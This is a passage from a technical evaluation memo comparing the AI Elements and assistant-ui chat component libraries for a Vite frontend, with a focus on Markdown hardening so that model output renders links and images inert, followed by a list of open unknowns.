1. **An unblessed framework position.** Docs require Next.js; the code does not. mymemo-web on
   Vite would be running a configuration Vercel neither tests nor documents, and each registry
   update is a re-audit of copied files against that assumption. Concretely: add
   `@source "../node_modules/streamdown/dist/*.js"` to the Tailwind entry, initialise shadcn/ui
   in CSS-Variables mode with an `@/*` alias, silence Rollup's `"use client"` warnings, and stay
   on React 19 + Tailwind 4.
2. **Rebuilding, in app code, everything assistant-ui's runtime gives you** — thread list,
   history hydration from `GET messages`, edit-and-resubmit, branching state, and an attachment
   upload seam that is not "inline the file as a data URL". Whether that is a cost depends
   entirely on how much of that surface mymemo-web actually needs; for a single-thread transcript
   driven by `useChat` against `agent-front`, most of it is not on the critical path.
3. **Owning the Markdown hardening yourself, forever.** The shipped configuration violates
   ADR-0017 on three counts (bare-URL linkification, live anchors, `<img src>` that fetches on
   render). Nothing warns you; the linkified output looks fine. This needs a hardened
   `MessageResponse` plus a regression test that asserts a bare URL and an `![](…)` render inert.
4. **A dependency you cannot delete.** `streamdown` stays in `node_modules`. You can reconfigure
   and override it; you cannot remove its anchor and image code, and its releases (it ships
   roughly weekly) become an owned re-audit surface — the same duty ADR-0017 already accepted for
   `vega` and `mermaid`.

**What adopting AI Elements would buy.**

1. **Finished, tested chat furniture you would otherwise write**: auto-scrolling transcript with
   `role="log"` and a scroll-to-bottom affordance, a real prompt input (drag-drop, paste,
   screenshot, accept/size/count validation, submit-status states), Shiki code blocks, collapsible
   reasoning and tool cards keyed to the AI SDK's `ToolUIPart` state machine, sources and inline
   citations, a token/cost context meter — 47 of the 49 with browser-mode tests.
2. **Source you own,** which is the pivotal property for the ADR-0017 constraint: the hardening
   goes into `message.tsx` at the one place `MessageResponse` is defined, so no call site can
   forget it. With an npm-only component library you would wrap (leaky), fork, or patch.
3. **Zero transport lock-in.** No `useChat` requirement, no `DefaultChatTransport` assumption,
   no runtime to adopt. The existing `useChat` + `DefaultChatTransport` prototype wiring is
   untouched; a custom `ChatTransport` or a plain `UIMessage[]` would work equally well.
4. **A defensible `data-artifacts` story too** — the same app-owned switch that renders
   `data-generative-ui` renders the artifacts part; `artifact` and `file-tree` are plausible
   presentation for it.

**Can the five-component generative-UI registry hang off it?** Yes — but AI Elements contributes
nothing to it. `PresentUI` payloads arrive as `data-generative-ui` parts already validated by
`@mymemo/ui-catalog` (five names, 16 KiB envelope, pinned Vega-Lite schema); rendering them is
one `case "data-generative-ui":` in the `parts.map` switch you write either way, dispatching into
a `Record<string, ComponentType>` you also write, with a framed fallback on an unknown name. What
you lose relative to assistant-ui is a *shipped and documented* primitive for exactly that —
`MessagePrimitive.GenerativeUI`'s registry, its `GenerativeUIRenderError`-or-`Fallback` contract,
and its progressive rendering of a partially-streamed spec. Reproducing the first two is perhaps
40 lines; reproducing progressive partial-spec rendering is more, and is only needed if payloads
ever stream incrementally rather than arriving whole (today they arrive whole, on `PresentUI`
completion). Note also that assistant-ui's own security note is explicit that the allowlist
constrains *which* component renders and not *what props it gets* — mymemo's server-side
`@mymemo/ui-catalog` validation is the part that actually closes that hole, and it is
framework-independent.

**Does the no-links/no-images constraint survive?** Yes, and demonstrably better than the status
quo — but only if you configure it, and it must be configured in **two** places, not one:

- **The prose lane** (`MessageResponse`): re-declare `rehype-harden` with
  `allowedLinkPrefixes: []`, `allowedImagePrefixes: []`, `allowDataImages: false`,
  `linkBlockPolicy: "text-only"`, `imageBlockPolicy: "remove"`, keeping
  `defaultRehypePlugins.raw` and `defaultRehypePlugins.sanitize`. Verified output: bare URLs,
  autolinked `www.` forms and `[text](url)` all render as inert `<span>` text; images vanish.
  That satisfies ADR-0017's rule. It does not reproduce ADR-0017's *mechanism* — the ADR specifies
  an emphasis-only renderer with no link/image constructs at all, "enforced by renderer capability,
  not linting", whereas this is full CommonMark+GFM whose link and image output is neutralised one
  layer downstream. One `rehypePlugins` regression and the surface is back; a test asserting inert
  output is what makes the difference load-bearing rather than incidental.
- **The catalog lane**: unchanged. `@mymemo/ui-catalog` has no URL-bearing prop, so nothing in
  the five components can carry a link or an image regardless of UI library.

And **do not install `jsx-preview`**: it renders model-authored JSX strings through
`react-jsx-parser` at its permissive defaults (`allowUnknownElements: true`, only `<script>` and
`on*` handlers blocked), so `<a href>` and `<img src>` pass straight through. It is the one
component in the set that is structurally incompatible with ADR-0017.

**The comparison in one line.** AI Elements is a *wider* and *better-hardened* widget set with
*no runtime*; assistant-ui is a *narrower* widget set over a *real runtime* with a purpose-built
generative-UI seam and a markdown default that is worse than AI Elements'. Choosing AI Elements
trades a shipped runtime and a shipped generative-UI primitive for a much larger set of finished
components and a markdown pipeline whose hardening is a config object rather than a fork.

## Open unknowns

- **Vite in practice.** Nobody has actually run an AI Elements component in a Vite build. The
  absence of `next/*` imports, the CLI's lack of framework detection, and shadcn's official Vite
  support make it very likely to work, but "verified by grep" is not "verified by build". The
  cheap resolution is a throwaway Vite app with `message` + `conversation` installed.
- **Whether the stale `message.mdx` prop table is a docs bug or a deprecated passthrough.**
  `allowedLinkPrefixes` / `allowedImagePrefixes` / `defaultOrigin` are documented as
  `<MessageResponse />` props but are absent from `streamdown@2.4.0`'s published
  `dist/index.d.ts` and from `2.6.0`'s `StreamdownProps`. I could not find a changelog entry or
  issue recording the move. Treated here as a docs bug; not confirmed by Vercel.
- **Streamdown's docs contradict its README on blocked links.** `security.mdx` says "Any links
  not matching the allowed prefixes will be rewritten to point to the `defaultOrigin`", while
  `rehype-harden`'s README and my probe both show `linkBlockPolicy` behaviour (`[blocked]`
  indicator / text-only / removed). The probe is authoritative for the default policy; the
  rewrite-to-`defaultOrigin` claim is unverified.
- **Whether `question`'s absence from the live registry is deployment lag.** `main` has 49
  components, the served registry 48. No first-party statement about registry deploy cadence or
  how registry contents are versioned against `main` was found.
- **No stability or semver policy for component APIs.** Copy-in distribution means there is
  nothing to promise, and nothing is promised. There is no changelog for registry contents.
- **Data-part guidance is absent, not hidden.** Verified across component source, all 88 registry
  blocks, and every docs page: AI Elements says nothing about `data-*` custom parts. This is an
  observed absence as of the pinned commit, not evidence that the pattern is discouraged.
- **`data:` images blocked earlier than expected.** In the probe, `![](data:image/png;base64,…)`
  was blocked even with `allowDataImages: true`, because `rehype-sanitize`'s schema strips the
  `src` before `harden` sees it. Consistent across both configurations, but I did not trace it
  through Streamdown's React render path, so treat it as observed-in-pipeline rather than a
  guaranteed property.
- **Bundle-size impact of the Streamdown stack** (Shiki, KaTeX, Mermaid, `@xyflow/react`,
  `media-chrome`, Rive) on a Vite build was not measured. Plugins are opt-in per component, but
  `message.tsx` as shipped wires `cjk`, `code`, `math` and `mermaid` unconditionally.
- **On the assistant-ui side**, two items came back unverified: whether
  `MessagePrimitive.GenerativeUI` is production-stable or experimental (it carries no `unstable_`
  prefix and is fully documented, but no explicit stability statement was found), and whether
  disabling GFM/linkification has any documented recipe (the mechanism — dropping `remarkGfm`
  from the copied `markdown-text.tsx` — is inferred from the passthrough prop, not documented).
